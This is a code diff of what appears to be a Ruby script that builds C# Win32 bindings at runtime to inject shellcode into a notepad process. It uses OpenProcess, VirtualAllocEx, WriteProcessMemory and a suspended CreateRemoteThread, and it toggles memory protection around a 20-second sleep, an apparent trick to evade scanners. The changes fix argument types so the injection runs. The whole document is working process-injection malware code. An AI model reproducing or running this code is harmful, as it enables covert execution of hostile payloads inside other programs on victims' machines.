@@ -68,19 +68,19 @@ code = %@
         public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
 
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
         [DllImport("kernel32.dll")]
-        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
 
         [DllImport("kernel32.dll")]
-        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
+        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
 
         [DllImport("kernel32.dll")]
-        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
         [DllImport("kernel32.dll", SetLastError = true)]
-        static extern uint ResumeThread(IntPtr hThread);
+        public static extern uint ResumeThread(IntPtr hThread);
         }
     }
  @
@@ -100,23 +100,23 @@ targetProcess = System::Diagnostics::Process.GetProcessesByName("notepad")[0]
 assembly = generate(code)
 injection = assembly.get_types()[0]
 
-params = System::Array[System::Object].new([0x001F0FFF, false, targetProcess.Id])
+params = System::Array[System::Object].new([System::UInt32.new(0x001F0FFF), false, targetProcess.Id])
 procHandle = injection.get_method('OpenProcess').invoke(nil, params)
 mc = System::UInt32.new(0x3000)
 perw = System::UInt32.new(0x40)
-params = System::Array[System::Object].new([procHandle, System::IntPtr.Zero, shellcode.Length,  mc, perw])
+params = System::Array[System::Object].new([procHandle, System::IntPtr.Zero, System::UInt32.new(shellcode.Length),  mc, perw])
 resultPtr = injection.get_method('VirtualAllocEx').invoke(nil, params)
 bytesWritten = System::IntPtr.Zero
 params = System::Array[System::Object].new([procHandle, resultPtr, shellcode, shellcode.Length, bytesWritten])
 resultBool = injection.get_method('WriteProcessMemory').invoke(nil, params)
 oldProtect = System::UInt32.new(0)
-params = System::Array[System::Object].new([procHandle, resultPtr, shellcode.Length, System::UInt32.new(0x01), oldProtect])
+params = System::Array[System::Object].new([procHandle, resultPtr, System::UIntPtr.new(shellcode.Length), System::UInt32.new(0x01), oldProtect])
 resultBool = injection.get_method('VirtualProtectEx').invoke(nil, params)
 thread_id = System::IntPtr.Zero
-params = System::Array[System::Object].new([procHandle, System::IntPtr.Zero, 0, resultPtr, System::IntPtr.Zero, 0x00000004, thread_id])
+params = System::Array[System::Object].new([procHandle, System::IntPtr.Zero, System::UInt32.new(0), resultPtr, System::IntPtr.Zero, System::UInt32.new(0x00000004), thread_id])
 hThread = injection.get_method('CreateRemoteThread').invoke(nil, params)
 System::Threading::Thread.Sleep(20000)
-params = System::Array[System::Object].new([procHandle, resultPtr, shellcode.Length, System::UInt32.new(0x40), oldProtect])
+params = System::Array[System::Object].new([procHandle, resultPtr, System::UIntPtr.new(shellcode.Length), System::UInt32.new(0x40), oldProtect])
 resultBool = injection.get_method('VirtualProtectEx').invoke(nil, params)
 params = System::Array[System::Object].new([hThread])
 injection.get_method('ResumeThread').invoke(nil, params)
